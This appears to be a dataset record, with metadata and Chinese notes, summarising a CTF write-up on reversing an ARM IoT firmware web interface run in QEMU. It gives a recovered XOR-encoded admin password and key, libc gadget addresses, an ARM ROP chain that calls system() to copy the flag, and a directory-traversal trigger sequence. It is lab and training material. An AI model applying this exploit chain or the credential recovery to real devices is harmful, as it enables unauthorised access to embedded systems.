---
title: 第八届强网拟态防御国际精英挑战赛 - WIN!致敬mt 复现
contest: 强网拟态防御国际精英挑战赛
year: 2024
difficulty: hard
vuln_type: misc_unknown
tags: [IoT固件,ARM-QEMU,lighttpd,CGI,ARM-ROP,XOR+Base64编码,弱口令,目录穿越]
attack_chain: 1. QEMU启动debian-armel-versatilepb rootfs→scp下载/var/www/cgi-bin和lighttpd二进制→逆向auth.cgi(0x03FC限制+8段循环+XOR编码)|2. users.txt admin:dlZ4bWFsdjUDaiYCeCUqfGYUEhBvFW97dmtxcA==→xor_key=N1K_ROUT3R(10字节)→base64+10字节循环XOR→密码8g323##a08h33zx33@!B!$$$$$$$|3. login+upload_pubkey(80字节payload_store)→set_publicfile(cnt1=80,cnt2=idx)→watch创建rootkey|4. 目录穿越:"../"*((0x60-15)//2) + "/rootkey" + "nik.gif" → download 触发 make_rop|5. ARM ROP: pop {lr};bx lr + pop {r0,lr};bx lr + system+ "cat /home/ctf/flag > /tmp/store/logs.txt"|6. manage(action=manage, rk=rootkey)执行ROP+manage(action=logs)读log得flag
key_payload: users.txt admin:dlZ4bWFsdjUDaiYCeCUqfGYUEhBvFW97dmtxcA==|xor_key=N1K_ROUT3R|8g323##a08h33zx33@!B!$$$$$$$|libc=0xb6e8f000 pop_lr=0x00015b24+libc pop_r0_lr=0x0010c730+libc system=0x38d34+libc shm_addr=0xb6ffc000|rop=b'a'*0x24+p32(pop_lr)+p32(pop_r0_lr)+p32(args_addr)+p32(system)+cmd+'\0'|manage("action":"download","path":file_path) + manage("setid":"-1") + make_rop() + manage("action":"manage","rk":rootkey) + manage("action":"logs")
one_liner: 第八届强网拟态防御IoT固件逆向,QEMU跑debian-armel-versatilepb,scp拉cgi-bin(auth.cgi/manage.cgi/upload.cgi/watch/session_check.cgi/lang.cgi)逆向XOR+Base64密码编码得8g323密码,目录穿越../rootkey+ARM ROP(libc base 0xb6e8f000+pop {lr}/pop {r0,lr}+system)cat flag到logs
lesson: 1) IoT固件逆向流程:QEMU启动→scp/rsync拉二进制→IDA/Ghidra逆向→密码还原→web/管理接口漏洞; 2) auth.cgi密码编码:base64+10字节循环XOR(xor_key常硬编码在二进制); 3) ARM ROP gadget:pop {lr};bx lr(0x15b24+libc)+pop {r0,lr};bx lr(0x10c730+libc); 4) shm_addr(共享内存)用于存放system参数(命令字符串); 5) 目录穿越(./../)触发make_rop覆盖返回地址; 6) manage.cgi(rk参数)+upload_pubkey组合upload+set+manage链触发ROP
quality: high
---

## 备注

原文(https://www.ctfiot.com/283883.html)看雪ID:flyyyy。

### 题目详情

**QEMU启动命令**
```
sudo qemu-system-arm -M versatilepb -m 256 -kernel vmlinuz-3.2.0-4-versatile -initrd initrd.img-3.2.0-4-versatile -hda debian_wheezy_armel_standard.qcow2 -append "root=/dev/sda1 console=ttyAMA0" -net nic -net user,hostfwd=tcp::1337-:80,hostfwd=tcp::1338-:22,hostfwd=tcp::1234-:1234 -nographic
```

**scp拉文件**
```
scp -r -P 1338 root@127.0.0.1:/var/www/cgi-bin ./
scp -P 1338 root@127.0.0.1:/usr/sbin/lighttpd ./
```

**cgi-bin文件**
- auth.cgi (登录)
- lang.cgi (setid)
- manage.cgi (管理操作)
- session_check.cgi
- upload.cgi (upload_pubkey)
- watch (创建rootkey)

**密码逆向**
- users.txt:`admin:dlZ4bWFsdjUDaiYCeCUqfGYUEhBvFW97dmtxcA==`
- xor_key=`N1K_ROUT3R`(10字节)
- 解密:base64.b64decode + XOR(key循环)
- 密码:`8g323##a08h33zx33@!B!$$$$$$$`

**auth.cgi逆向关键**
- 8段循环,idx==0x03FC时break
- 编码:`v60=v70>>2; v59=16*(v70&3)|(v57>>4)` 提取6bit base64索引
- 表: `aAbcdefghijklmn` 自定义base64

**ARM ROP链**
- libc=0xb6e8f000
- pop_lr=0x15b24 (pop {lr}; bx lr)
- pop_r0_lr=0x10c730 (pop {r0, lr}; bx lr)
- system=0x38d34
- shm_addr=0xb6ffc000 (命令字符串存放)
- args_addr=shm_addr+0x24+0x4*4
- rop=`a*0x24 + p32(pop_lr) + p32(pop_r0_lr) + p32(args_addr) + p32(system) + cmd + \0`

**完整EXP链**
1. login(username=admin, password=8g323...)
2. redirect_flag_to_log():
   - create_rootkey() = GET /cgi-bin/watch
   - 目录穿越下载upload_pubkey(80字节)+set_publicfile(cnt1=80,cnt2=idx)填充ROP
   - manage("setid":"-1")
   - make_rop() 触发ROP
   - manage("action":"manage","rk":rootkey)执行
3. get_flag() = manage("action":"logs")读log

## 评级

- **quality: high** — 完整IoT固件逆向+QEMU+ARM ROP+目录穿越+upload_pubkey链,作者flyyyy是高质作者
- **vuln_type: misc_unknown** — IoT/固件逆向混合
- 实战价值:IoT固件CGI接口常见base64+XOR弱口令+目录穿越触发ROP
